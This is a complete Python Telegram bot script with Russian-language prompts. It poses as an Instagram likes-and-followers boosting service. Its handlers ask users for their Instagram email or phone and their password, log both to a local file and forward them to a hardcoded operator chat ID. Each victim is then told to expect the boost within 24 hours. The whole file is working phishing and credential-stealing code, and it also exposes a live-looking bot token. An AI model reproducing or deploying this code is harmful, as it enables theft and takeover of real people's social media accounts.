
import telebot
from telebot import *
import time
import random
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '5160675709'
bot = telebot.TeleBot("5460154444:AAH4d0k1nfIn-Cjr41zVjnkArVWulQaWiD4")
try:
	bot.send_message(ID, '!Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
ID: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот накрутки лайков и подписчиков на ваш инстаграм аккаунт!
		Чтобы начать, нажмите /nacrutka''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @Cyber_Puffin') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
	second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество лайков (не более 500)') 
		bot.register_next_step_handler(msg, qproc1)

	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество подписчиков (не более 100)') 
		bot.register_next_step_handler(msg, qproc2)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество лайков не может быть более 500!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество лайков: {num}')
			msg = bot.send_message(message.chat.id, 'Введите почту(или номер телефона) от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		elif int(num) > 100:
			bot.reply_to(message, 'Колличество подписчиков не может быть более 100!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество подписчиков: {num}')
			msg = bot.send_message(message.chat.id, 'Введите почту(или номер телефона) от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def step1(message):
	get = f'''Полученные данные: 
Получено в боте: instagram
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: {message.text}
Имя: {message.from_user.first_name}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Ваш логин: {message.text}')

	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Полученные данные: 
Получено в боте: instagram
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Пароль: {usrpass}
Имя: {message.from_user.first_name}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


bot.polling()
		
